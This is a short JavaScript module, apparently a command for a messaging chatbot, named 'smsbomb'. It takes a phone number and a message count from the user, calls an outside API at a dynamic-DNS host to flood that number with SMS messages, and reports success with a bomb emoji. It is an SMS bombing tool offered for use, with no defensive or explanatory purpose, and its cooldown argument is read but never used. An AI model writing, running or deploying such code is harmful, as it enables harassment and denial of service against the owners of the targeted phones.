const axios = require('axios');

module.exports = {
  name: 'smsbomb',
  description: 'Initiates SMS bombing by sending multiple SMS messages.',
  author: 'developer',

  async execute(senderId, args, pageAccessToken, sendMessage) {
    const [phone, amount, cooldown] = args;

    if (!phone || !amount || !cooldown) {
      sendMessage(senderId, { text: 'Usage: smsbomb [phone] [amount] [cooldown]' }, pageAccessToken);
      return;
    }

    sendMessage(senderId, { text: '⚙️ Starting SMS Bombing...' }, pageAccessToken);

    try {
      const response = await axios.get('https://ccprojectapis.ddns.net/api/smsbomb', {
        params: {
          phonenum: phone,
          spamnum: amount
        }
      });

      const data = response.data;
      console.log('Response:', data);

      sendMessage(senderId, { text: 'Success! All messages have been sent 💣' }, pageAccessToken);
    } catch (error) {
      console.error('Error:', error);
      sendMessage(senderId, { text: '🔥 An error occurred while sending messages.' }, pageAccessToken);
    }
  }
};
